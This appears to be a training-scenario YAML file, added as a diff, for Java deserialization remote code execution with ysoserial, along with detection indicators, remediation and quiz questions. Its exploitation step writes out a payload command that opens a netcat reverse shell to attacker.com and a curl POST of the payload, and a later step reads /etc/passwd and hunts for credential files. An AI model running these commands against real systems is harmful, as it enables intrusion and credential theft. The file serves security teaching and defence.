@@ -1,0 +1,105 @@
+# Category: Offensive Security - Application
+name: "Java Deserialization Vulnerability – RCE via ysoserial"
+id: "app-java-deserialization-001"
+category: "offensive_security"
+subcategory: "application_security"
+difficulty: "advanced"
+estimated_time: "90 minutes"
+
+description: |
+  Exploit Java deserialization vulnerabilities by sending a malicious
+  serialized object to an application that deserializes untrusted data.
+  Using tools like ysoserial, an attacker can generate payloads leveraging
+  common gadget chains (e.g., Commons Collections, Spring, JRE) to achieve
+  remote code execution.
+
+learning_objectives:
+  - Understand Java serialization and deserialization
+  - Identify endpoints that accept serialized Java objects
+  - Use ysoserial to generate payloads
+  - Execute commands on the target server
+
+tools:
+  - ysoserial
+  - Burp Suite
+  - Java Runtime Environment
+  - netcat (for reverse shells)
+
+prerequisites:
+  - Target endpoint that deserializes Java objects (e.g., RMI, JMS, HTTP sessions)
+  - Known gadget chain present in classpath
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify deserialization endpoint"
+    commands:
+      - "# Look for content-type: application/x-java-serialized-object"
+      - "# Or check for binary data in POST requests"
+      - "# Use Burp extensions like Java Deserialization Scanner"
+    expected_output: "Endpoint identified as serialized object"
+    detection: "Network traffic with Java serialized stream magic bytes (0xAC ED 00 05)"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Generate and send ysoserial payload"
+    commands:
+      - "# Generate payload using CommonsCollections1 (example)"
+      - "java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/bash attacker.com 4444' > payload.ser"
+      - "# Encode (if needed) and send to endpoint"
+      - "curl -X POST http://target.com/endpoint --data-binary @payload.ser -H 'Content-Type: application/x-java-serialized-object'"
+    expected_output: "Reverse shell connection to attacker's netcat listener"
+    detection: "Outbound connections from target server to external IP; high CPU usage during deserialization"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Escalate privileges or maintain access"
+    commands:
+      - "# Use shell to probe for sensitive files"
+      - "cat /etc/passwd"
+      - "# Check for credential files"
+      - "find / -name *.properties 2>/dev/null"
+    expected_output: "Access to system files and credentials"
+    detection: "File system access by web user (www-data, tomcat)"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A08:2021"
+    description: "Software and Data Integrity Failures"
+
+detection:
+  network_indicators:
+    - "Serialized object streams (magic bytes) sent to suspicious endpoints"
+    - "Large payloads (ysoserial payloads can be 5-10KB)"
+  log_indicators:
+    - "Application errors like `java.io.InvalidClassException`"
+    - "RMI registry activity from unexpected IPs"
+  endpoint_indicators:
+    - "ysoserial execution on attacker machine"
+
+remediation:
+  immediate:
+    - "Disable deserialization of untrusted data (use allowlists)"
+    - "Apply patches to remove known gadget classes (e.g., remove Apache Commons Collections from classpath)"
+  long_term:
+    - "Use alternative serialization formats (JSON, Protocol Buffers)"
+    - "Implement object input filter (JEP 290)"
+
+variables:
+  target_url: "http://target.com/rmi-endpoint"
+  attacker_ip: "10.0.0.5"
+  reverse_port: "4444"
+
+assessment_questions:
+  - "What magic bytes identify a Java serialized object?"
+  - "How does ysoserial achieve RCE without writing code?"
+  - "What is JEP 290 and how does it mitigate deserialization attacks?"
+
+references:
+  - url: "https://github.com/frohoff/ysoserial"
+    title: "ysoserial GitHub"
+  - url: "https://www.oracle.com/java/technologies/javase/seccodeguide.html#8"
+    title: "Java Secure Coding - Deserialization"
